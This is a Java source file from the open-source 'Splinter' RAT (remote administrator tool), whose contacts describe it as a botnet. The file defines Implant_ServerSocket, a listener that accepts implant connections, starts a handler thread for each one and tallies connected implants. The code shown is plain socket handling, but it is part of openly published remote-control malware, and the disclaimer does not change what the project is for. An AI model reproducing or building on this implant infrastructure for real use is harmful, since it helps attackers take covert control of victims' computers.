/**

	Copyright:
	==========
	
	Splinter - The RAT (Remote Administrator Tool)
	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
	Copyright 2013 Solomon Sonya
	
	This copyright applies to the entire Splinter Project and all relating source code

	This program is free software: you are free to  redistribute 
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.       

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	By executing this program, you assume full responsibility 
	and will hold zero responsibility, liability, damages, etc to the
	development team over this program or any variations of this program.
	This program is not meant to be harmful or used in a malicious manner.
	
	Notes:
	===========
	This program is 100% open source and still a very BETA version. 
	I don't know of any significant bugs.... but I'm sure they may exist ;-)
	If you find one, congratulations, please forward the data back to us 
	and we'll do our best to put a fix/workaround if applicable (and time permitting...)
	Finally, feature imprevements/updates, etc, please let us know what you would
	like to see, and we'll do my best to have it incorporated into the newer 
	versions of Splinter or new projects to come.  We're here to help.
	
	Thanks again, 
	
	Solomon
	
	Contact: 
	========
	Twitter	--> @splinter_therat, @carpenter1010
	Email	--> splinterbotnet@gmail.com
	GitHub	--> https://github.com/splinterbotnet
**/



package Implant;

import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.util.ArrayList;

public class Implant_ServerSocket extends Thread
  implements Runnable
{
  String strMyClassName = getName();

  public static int svrSocketPort = -1;
  public static InetAddress localhost = null;
  public static ServerSocket svrSocket = null;
  public static String serverAddr = "";

  public static boolean serverSocketRunning = false;

  public static volatile boolean keepServerSocketOpen = true;
  public static volatile boolean allow_multiple_connections = true;

  public Implant_ServerSocket(int prt, boolean allow_mult_connection_mode)
  {
    try
    {
      Driver.alImplant = new ArrayList();
      svrSocketPort = prt;
      allow_multiple_connections = allow_mult_connection_mode;
    }
    catch (Exception e)
    {
      Driver.eop("Thread_ServerSocket Constructor", this.strMyClassName, e, "", true);
    }
  }

  public void run()
  {
    boolean establishSocket = true;

    establishServerSocket(svrSocketPort);

    while (keepServerSocketOpen)
    {
      Socket sckClientSocket = null;
      try
      {
        sckClientSocket = svrSocket.accept();

        Splinter_IMPLANT implant = new Splinter_IMPLANT(svrSocketPort, sckClientSocket);
        implant.start();

        Driver.alImplant.add(implant);
        Driver.numConnectedImplants += 1L;
      }
      catch (SocketException se)
      {
        Driver.sop("ServerSocket is closed. I am terminaing waiting for connections.  Please re-establish ServerSocket if necessary");
        keepServerSocketOpen = false;
        break;
      }
      catch (Exception e)
      {
        Driver.eop("ServerSocket thead run", this.strMyClassName, e, "Not a problem. Perhaps remote agent disconnected. Please re-establish the server socket if necessary", false);
      }
    }
  }

  public boolean establishServerSocket(int prt)
  {
    try
    {
      serverSocketRunning = false;
      keepServerSocketOpen = false;
      try
      {
        svrSocket = new ServerSocket(prt);
      }
      catch (SocketException se)
      {
        Driver.sop("Unable to bind to port " + prt + ". ServerSocket is Closed. You must try another port in order to continue");
        System.exit(0);
        return false;
      }

      localhost = InetAddress.getLocalHost();

      String success = " * * * * * ServerSocket Established at " + Driver.getTimeStamp_Without_Date() + " * * * * *\n" + 
        "Server HostName: " + localhost.getHostName() + "\n" + 
        "Server IP: " + localhost.getHostAddress() + "\n" + 
        "Listening for Implants on Port: " + prt;

      Driver.sop(success);

      keepServerSocketOpen = true;

      serverSocketRunning = true;

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("establishServerSocket", this.strMyClassName, e, "Unable to maintain established server socket", true);
    }

    return false;
  }
}